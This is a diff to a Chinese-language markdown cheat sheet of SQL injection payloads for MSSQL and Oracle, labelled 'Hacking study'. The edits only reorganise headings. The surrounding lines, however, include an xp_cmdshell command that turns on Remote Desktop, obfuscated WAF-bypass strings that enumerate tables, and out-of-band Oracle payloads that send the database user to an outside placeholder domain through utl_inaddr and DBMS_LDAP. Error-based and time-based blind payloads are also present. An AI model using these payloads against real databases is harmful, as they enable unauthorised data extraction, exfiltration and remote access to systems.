@@ -9,13 +9,19 @@
 * [Hacking study](#渗透相关语法)
 	* [注入基础](#注入基础)
 		 * [mssql注入](#mssql注入)
+			* [布尔注入](#布尔注入)
+			* [报错注入](#报错注入)
+			* [绕waf](#绕waf)
 		 * [oracle注入](#oracle注入)
-	 
+			* [联合查询](#联合查询)
+			* [报错注入](#报错注入)
+			* [带外注入](#带外注入)
+			* [时间盲注](#时间盲注)
 ## 注入基础
 > **mssql、mysql、oracle 相关注入基础语句** 
 ### mssql注入
 
-布尔注入：
+####布尔注入：
 
 **判断版本号**
 ```
@@ -60,7 +66,7 @@
 ';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
 ```
 
-报错注入：
+####报错注入：
 
 **查看版本号**
 ```
@@ -100,7 +106,7 @@ file_name(@@version)
 ' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
 ```
 
-绕waf
+####绕waf
 
 **获取版本和数据库名**
 ```
@@ -116,9 +122,10 @@ file_name(@@version)
 '%1eaND%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename/**/(name)%1efRom 数据库名%0f..syscolumns%1ewHerE%1eid=(selEct/*xxxxxxxxx*/%1eid%1efrom%1e数据库名%0f..sysobjects%1ewHerE%1ename='表名')%1efoR%1eXML%1ePATH/**/(''))%1e-
 ```
 
-### oracle注入
+## oracle注入
 
-联合查询
+####联合查询
+
 **判断是否oracle，在mssql和mysql以及db2内返回长度值是调用len()函数；在oracle和INFORMIX则是length()**
 ```
 ' and len('a')=1--+
@@ -136,7 +143,7 @@ file_name(@@version)
 ' and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual--+
 ```
 
-报错注入
+####报错注入
 
 **获取当前数据库用户**
 ```
@@ -151,7 +158,8 @@ file_name(@@version)
 ' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--+
 ```
 
-带外注入
+####带外注入
+
 **获取当前数据库用户**
 ```
 ' and (select utl_inaddr.get_host_address((select user from dual)||'.xxx.xxx') from dual) is not null--+
@@ -162,7 +170,7 @@ file_name(@@version)
 ' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.xxxx.xxxx') from dual) is not null--+
 ```
 
-时间盲注
+#####时间盲注
 **当前获取用户**
 ```
 ' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))--+
